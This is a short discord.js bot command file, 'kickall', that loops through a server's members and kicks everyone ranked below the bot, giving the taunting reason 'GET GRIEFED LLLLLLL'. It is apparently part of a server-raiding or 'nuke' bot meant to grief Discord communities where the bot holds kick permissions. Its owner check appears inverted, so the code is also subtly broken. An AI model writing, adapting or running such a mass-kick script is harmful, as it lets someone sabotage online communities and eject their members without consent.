const { Client, Message, Permissions } = require("discord.js");
require('colors');

module.exports = {
    name: 'kickall',
    description: 'Kicks all members.',

    /**
     * 
     * @param {Client} bot 
     * @param {Message} message 
     * @param {String[]} parts 
     */

    async execute(bot, message, parts) {
        if(!message.guild.me.hasPermission('KICK_MEMBERS')) return console.log(`${`[ERROR]`.red} Missing Permission 'KICK_MEMBERS' on Guild ${message.guild.name}!`)
        message.guild.members.cache.forEach(async m => {
            if(m.roles.highest.position < message.guild.me.roles.highest.position) {
                if(bot.cfg.myID != '' && bot.cfg.myID != message.author.id) {
                    m.kick({
                        reason: `GET GRIEFED LLLLLLL`
                    });
                    await console.log(`${`[SUCCESS]`.green} ${`Successfully kicked member '${m.user.username}'!`.yellow}`)
                }
            } else {
                console.log(`${`[ERROR]`.red} ${`Missing Permissions for member '${m.user.username}' because his highest role is higher than my highest role!`.yellow}`);
            }
        })
    }
}